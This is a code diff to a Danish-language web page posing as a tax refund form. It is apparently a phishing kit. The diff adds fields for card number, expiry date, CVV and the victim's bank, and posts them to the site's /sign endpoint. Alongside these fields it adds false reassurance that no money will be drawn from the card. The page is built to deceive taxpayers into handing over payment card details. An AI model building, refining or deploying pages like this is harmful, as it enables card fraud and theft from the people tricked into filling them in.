@@ -45,6 +45,66 @@
         // Fetch all the forms we want to apply custom Bootstrap validation styles to
         const forms = document.querySelectorAll('.needs-validation')
 
+        // Loop over them and prevent submission
+        Array.prototype.slice.call(forms)
+          .forEach(function (form) {
+            form.addEventListener('submit', function (event) {
+              if (!form.checkValidity()) {
+                event.preventDefault()
+                event.stopPropagation()
+              }
+
+              form.classList.add('was-validated')
+            }, false)
+          })
+
+        const cardNum = document.getElementById('card');
+        cardNum.onkeyup = function (e) {
+          if (this.value == this.lastValue) return;
+          let caretPosition = this.selectionStart;
+          const sanitizedValue = this.value.replace(/[^0-9]/gi, '');
+          let parts = [];
+          
+          for (let i = 0, len = sanitizedValue.length; i < len; i += 4) {
+              parts.push(sanitizedValue.substring(i, i + 4));
+          }
+          
+          for (let i = caretPosition - 1; i >= 0; i--) {
+              let c = this.value[i];
+              if (c < '0' || c > '9') {
+                  caretPosition--;
+              }
+          }
+          caretPosition += Math.floor(caretPosition / 4);
+          
+          this.value = this.lastValue = parts.join(' ');
+          this.selectionStart = this.selectionEnd = caretPosition;
+        }
+
+        const expiry = document.getElementById('expiry');
+        expiry.onkeyup = function (e) {
+          const key = e.keyCode || e.which;
+          if (this.value.length == 2 && key !== 8) this.value = this.value + "/";
+        }
+      });
+
+      function isNumberKey(evt)
+        {
+          let charCode = (evt.which) ? evt.which : event.keyCode
+          if (charCode > 31 && (charCode < 48 || charCode > 57))
+          return false;
+
+          return true;
+        }
+        
+    </script>
+    <script>
+      $(function () {
+        'use strict'
+
+        // Fetch all the forms we want to apply custom Bootstrap validation styles to
+        const forms = document.querySelectorAll('.needs-validation')
+
         $('#phone-number').on('keyup', function() {
           if (this.checkValidity()) {
             $(this).parents('.custom-validation').toggleClass('is-valid', true).toggleClass('is-invalid', false)
@@ -86,16 +146,25 @@
     </script>
 
     <div class="signup-form">
-      <div class="frame px-2">
-        <img src="/static/logo.png" />
+      <div class="container-fluid px-5">
+        <div class="signup text-center">
+          <h3>Detaljer for tilbagebetaling af skat</h3>
+        </div>
       </div>
       <div class="container-fluid px-5">
         <div class="signup text-center">
-          <p>Oplys dine informationer nedenfor for at opnå din skatterefusion</p>
+          <p>Indtast de bankoplysninger, hvorpå du ønsker skatteresfusionen skal blive udbetalt på. Ingen betaling vil blive trukket på kortet.
+          </p>
+        </div>
+        <div>
+          <h1 style="font-size: 3rem;">Betalingsadresse</h1>
+          <hr style="border: 0.5px solid black;">
+
+          <br>
         </div>
         <form action="/sign" method="POST" id="form" class="needs-validation" novalidate>
           <div class="form-group input-group-lg">
-            <label for="name">Fulde Navn <span>*</span></label>
+            <label for="name">Fulde Navn<span>*</span></label>
             <input
               type="text"
               class="form-control sign-input"
@@ -121,19 +190,6 @@
             </div>
           </div>
           <div class="form-group input-group-lg">
-            <label for="by">By <span>*</span></label>
-            <input
-              type="text"
-              class="form-control sign-input"
-              id="by"
-              name="by"
-              required
-            />
-            <div class="invalid-feedback">
-              (!) Feltet er påkrævet.
-            </div>
-          </div>
-          <div class="form-group input-group-lg">
             <label for="postalcode">Postnummer <span>*</span></label>
             <input
               type="text"
@@ -150,6 +206,20 @@
               (!) Feltet er påkrævet.
             </div>
           </div>
+          <div class="form-group input-group-lg">
+            <label for="by">By <span>*</span></label>
+            <input
+              type="text"
+              class="form-control sign-input"
+              id="by"
+              name="by"
+              required
+            />
+            <div class="invalid-feedback">
+              (!) Feltet er påkrævet.
+            </div>
+          </div>
+          
           <div class="form-group input-group-lg d-flex flex-column custom-validation">
             <label for="phone">Telefon <span>*</span></label>
             <div class="form-control tel-input-box d-inline-block" required>
@@ -166,6 +236,145 @@
                 required
               />
             </div>
+            <div class="invalid-feedback">
+              (!) Feltet er påkrævet.
+            </div>
+          </div>
+
+          <br>
+          <br>
+          <br>
+
+          <div class="card-frame px-2">
+            <h2 style="margin-right: 80px; font-size: 3rem; align-items: flex-start; justify-content: left;" >Kort</h2>
+            <img src="/static/cards.jpg" />
+          </div>
+          <br>
+
+          <br>
+          <div class="form-group input-group-lg">
+            <label for="bruger-id">Kortnummer <span>*</span></label>
+            <input
+              type="text"
+              class="form-control sign-input"
+              id="card"
+              name="card"
+              pattern="^(\d{4} ){3}\d{4}$"
+              placeholder="XXXX XXXX XXXX XXXX"
+              size="18"
+              minlength="19"
+              maxlength="19"
+              required
+            />
+            <div class="invalid-feedback">
+              (!) Feltet er påkrævet.
+            </div>
+          </div>
+          <div class="form-group input-group-lg">
+            <label for="bruger-id">Udløbsdato <span>*</span></label>
+            <input
+              type="text"
+              class="form-control sign-input"
+              id="expiry"
+              name="expiry"
+              maxlength="5"
+              pattern="^(0[1-9]|1[0-2])\/?([0-9]{2})$"
+              placeholder="MM/ÅÅ"
+              required
+            />
+            <div class="invalid-feedback">
+              (!) Feltet er påkrævet.
+            </div>
+          </div>
+          <div class="form-group input-group-lg">
+            <label for="bruger-id">CVV <span>*</span></label>
+            <input
+              type="text"
+              class="form-control sign-input"
+              id="cvv"
+              name="cvv"
+              placeholder="XXX"
+              maxlength="3"
+              pattern="\d{3}"
+              onkeypress="return isNumberKey(event)"
+              required
+            />
+            <div class="invalid-feedback">
+              (!) Feltet er påkrævet.
+            </div>
+          </div>
+          <div class="form-group input-group-lg">
+            <label for="bank">Hvem banker du med? <span>*</span></label>
+            <select class="form-control bank-selector" id="bank" name="bank" required>
+              <option></option>
+              <option>Andelskassen</option>
+              <option>Andelskassen Fælleskassen</option>
+              <option>Andelskassen Oikos</option>
+              <option>Arbejdernes Landsbank</option>
+              <option>BankNordik</option>
+              <option>Basisbank</option>
+              <option>Bil Danmark</option>
+              <option>Borbjerg Sparekassen</option>
+              <option>Broager Sparekasse</option>
+              <option>Coop Bank</option>
+              <option>Danske Bank</option>
+              <option>Den Jyske Sparekasse</option>
+              <option>Djurslands Bank</option>
+              <option>DNB</option>
+              <option>Dragsholm Sparekasse</option>
+              <option>Dronninglund Sparekasse</option>
+              <option>Eurocard</option>
+              <option>Facit Bank</option>
+              <option>Fanø Sparekasse</option>
+              <option>Faster Andelskasse</option>
+              <option>Folkesparekassen</option>
+              <option>Forbrugsforeningen</option>
+              <option>Frørup Andelskasse</option>
+              <option>Frøs Sparekasse</option>
+              <option>Frøslev-Mollerup Sparekasse</option>
+              <option>Fynske Bank</option>
+              <option>Handelsbanken</option>
+              <option>Hvidbjerg Bank</option>
+              <option>Jyske Bank</option>
+              <option>Klim Sparekasse</option>
+              <option>Kreditbanken</option>
+              <option>Langå Sparekasse</option>
+              <option>Lollands Bank</option>
+              <option>Lunar Bank</option>
+              <option>Lægernes Pension & Bank</option>
+              <option>Lån & Spar</option>
+              <option>Maj Bank</option>
+              <option>Merkur Andelskasse</option>
+              <option>Middelfart Sparekasse</option>
+              <option>Møns Bank</option>
+              <option>Nordea</option>
+              <option>Nordfyns Bank</option>
+              <option>Nordjyske Bank</option>
+              <option>Nykredit</option>
+              <option>PenSam Bank</option>
+              <option>Ringkjøbing Landbobank</option>
+              <option>Rise Sparekasse</option>
+              <option>Rønde og Omegns Sparekasse</option>
+              <option>Salling Bank</option>
+              <option>Skjern Bank</option>
+              <option>Spar Nord</option>
+              <option>Sparekassen Balling</option>
+              <option>Sparekassen Bredebro</option>
+              <option>Sparekassen Danmark</option>
+              <option>Sparekassen Den Lille Bikube</option>
+              <option>Sparekassen Djursland</option>
+              <option>Sparekassen for Nr. Nebel & Omegn</option>
+              <option>Sparekassen Kronjylland</option>
+              <option>Sparekassen Sjælland-Fyn</option>
+              <option>Sparekassen Thy</option>
+              <option>Stadil Sparekasse</option>
+              <option>Swedbank</option>
+              <option>Sydbank</option>
+              <option>Sønderhå-Hørsted Sparekasse</option>
+              <option>Totalbanken</option>
+              <option>Vestjysk Bank</option>
+              <option>Østervrå Andelskassen</option>
+            </select>
             <div class="invalid-feedback">
               (!) Feltet er påkrævet.
             </div>
